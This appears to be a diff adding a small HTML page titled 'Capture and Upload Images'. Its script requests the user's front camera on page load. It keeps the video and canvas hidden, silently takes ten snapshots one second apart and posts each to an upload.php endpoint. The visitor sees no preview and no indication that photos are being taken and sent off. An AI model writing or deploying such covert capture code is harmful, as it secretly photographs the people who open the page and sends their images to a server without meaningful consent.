@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture and Upload Images</title>
+</head>
+<body>
+    <h1>Capture and Upload Images</h1>
+    <video id="video" width="640" height="480" style="display:none;"></video><br>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas><br>
+    
+    <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let imagesCaptured = 0;
+
+    // Access the camera and start capturing
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            video.play();
+            // Start capturing images
+            captureImages();
+        })
+        .catch(err => console.error('Access to camera was denied:', err));
+
+    function captureImages() {
+        const interval = setInterval(() => {
+            if (imagesCaptured >= 10) {
+                clearInterval(interval);
+                return;
+            }
+            captureImage();
+        }, 1000); // Capture an image every 1 second
+    }
+
+    function captureImage() {
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        
+        // Upload the image to the server
+        uploadImage(imageData);
+        
+        imagesCaptured++;
+    }
+
+    function uploadImage(imageData) {
+        fetch('upload.php', {
+            method: 'POST',
+            body: new URLSearchParams({ imageData }),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to upload image.');
+            }
+            console.log('Image uploaded successfully.');
+        })
+        .catch(error => console.error('Error uploading image:', error));
+    }
+    </script>
+</body>
+</html>
+
